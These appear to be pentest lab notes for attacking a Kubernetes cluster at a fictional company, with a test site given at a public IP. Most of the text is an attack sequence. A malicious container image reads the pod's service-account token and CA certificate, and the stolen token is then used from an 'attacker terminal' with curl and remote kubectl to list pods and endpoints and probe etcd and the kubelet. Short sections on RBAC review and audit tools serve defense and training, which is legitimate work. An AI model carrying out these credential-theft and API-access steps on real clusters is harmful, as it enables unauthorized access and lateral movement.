

TEST website : http://54.242.200.217:30000/


1. get the serviceaccount token

Malicious Image code
cat /var/run/secrets/kubernetes.io/serviceaccount/token

https://jwt.io/

Attacker terminal
export token in attacker terminal
   export TOK2=''
   echo $TOK2

2. get oknokloud pod certificate

Malicious Image code
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

Attacker terminal
save certificate in cert file crtpod.crt in attacker machine

3. get oknokloud endpoints

Malicious Image code
curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"  https://100.64.0.1/api/v1/namespaces/default/endpoints



4. TRY : list k8s pod for okno company  namespace from Attacker Terminal

curl --cacert crtpod.crt  -H "Authorization: Bearer $TOK" https://IP:443/api/v1/namespaces/okno-sys/pods

 k8s API IP Master


5. list k8s environment endpoints from vulnerable web

Malicious Image code
curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"  https://100.64.0.1/api/v1/namespaces/default/endpoints

6. connect from Attacker terminal / local k8s api (remote kubectl ) to oknokloud k8s api using pod serviceaccounttoken

run setup_kubeconfig.sh Script in Attacker terminal
sh setup_kubeconfig.sh
this script need two parameters
first one : token
second one: k8s api master IP

7. Check Access matrics for remote kubectl
     it can be done by install krew plugin
https://github.com/kubernetes-sigs/krew-index

8. Do some Reverse Engineering

 kubectl auth can-i create pod


k8s Developer help
---------------------------------------
1.  find serviceaccount name and description for the pod
     kubectl get pod,sa -n okno-sys
     kubectl describe sa default -n okno-sys

2.  find out which clusterroles or roles are bound to the service account

kubectl get rolebindings,clusterrolebindings \
  --all-namespaces  \
  -o custom-columns='KIND:kind,NAMESPACE:metadata.namespace,NAME:metadata.name,SERVICE_ACCOUNTS:subjects[?(@.kind=="ServiceAccount")].name' | grep "default"

3- bring Clusterrole,role From rolebindings,clusterrolebindings
   kubectl describe ClusterRoleBinding name

4- Describe ClusterRole to check verb
   kubectl describe ClusterRole name

5- edit ClusterRole to be more secure
   kubectl edit  ClusterRole okno-role


---------------------------------------

Gray box pentest

kubehunter
https://github.com/cyberark/kubernetes-rbac-audit
https://github.com/cyberark/KubiScan


commands from master node

1. kube-hunter
    kube-hunter

2. kubernetes-rbac-audit
    cd kubernetes-rbac-audit/
    sh collectRoles.sh
    sh RoleCheck.sh

3. KubiScan
   kubiscan -e   help
   kubiscan -rs   risky subject (group,user,serviceaccount)
   kubiscan -rp   risky pod container
   kubiscan -rr   risk  role ^no
   kubiscan -rcr  risky clusterole
   kubiscan -rb   risky rolebinding
   python3 KubiScan/KubiScan.py -rcb






   Pentest K8S Methodology 2



   curl commands

   k8s API  : curl -K https://IP:443
   ETCD     : curl -K https://IP:2379/version
   Kubelete : curl -K https://IP:10250
              curl -K https://IP:10250/metrics
   curl -K https://IP:6443
   curl -K https://IP:6443/healthz

    with Token

    curl -K -H "Authorization: Bearer $TOK" https://IP:8080/api/v1/namespaces/default/pods
    curl -K -H "Authorization: Bearer $TOK" https://IP:443/api/v1/namespaces/default/pods
    curl -K -H "Authorization: Bearer $TOK" https://IP:6443/api/v1/namespaces/default/pods

   curl -K https://IP:8080/api/v1
   curl -K https://IP:8080/api/v1/namespaces
   curl -K https://IP:8080/api/v1/namespaces/default/pods
   curl -K https://IP:8080/api/v1/namespaces/okno-sys/pods

   with Token

   curl -K -H "Authorization: Bearer $TOK" https://IP:8080/api/v1/namespaces/okno-sys/pods
   curl -K -H "Authorization: Bearer $TOK" https://IP:443/api/v1/namespaces/okno-sys/pods
   curl -K -H "Authorization: Bearer $TOK" https://IP:6443/api/v1/namespaces/okno-sys/pods
   curl -K -H "Authorization: Bearer $TOK" https://IP:10250/metrics
   curl -K -H "Authorization: Bearer $TOK" https://IP:10250/pods
   curl --cacert crtpod.crt  -H "Authorization: Bearer $TOK" https://IP:443/api/v1/namespaces/okno-sys/pods
